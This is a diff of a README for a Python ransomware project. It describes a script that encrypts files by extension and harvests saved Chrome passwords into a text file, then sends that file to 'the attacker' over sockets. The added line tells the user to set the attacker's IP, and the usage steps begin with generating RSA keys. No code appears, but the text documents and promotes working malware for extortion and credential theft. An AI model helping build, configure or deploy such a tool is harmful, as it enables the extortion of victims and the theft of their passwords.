@@ -3,7 +3,7 @@ This is a python based ransomware , it encryptes files with specified extensions
 It also fetched saved passwords in chrome and saves it in a txt file the  sends the txt file to the attacker via sockets
 
 # Warning
-!! Chnage the path on line 51 to a testing folder !! this script only encryptes .txt files you can add more extension in file_exts on line 31
+!! Chnage the path on line 51 to a testing folder !! change the host on line 25 the attackers ip (only works if both devices are in the same network (am working on sending over internet) !! this script only encryptes .txt files you can add more extension in file_exts on line 31
 
 # HOW TO
 - first thing run the gen_public_private_keys.py this script will generate two asymmetric rsa encryption keys namely public.pem and private.pem
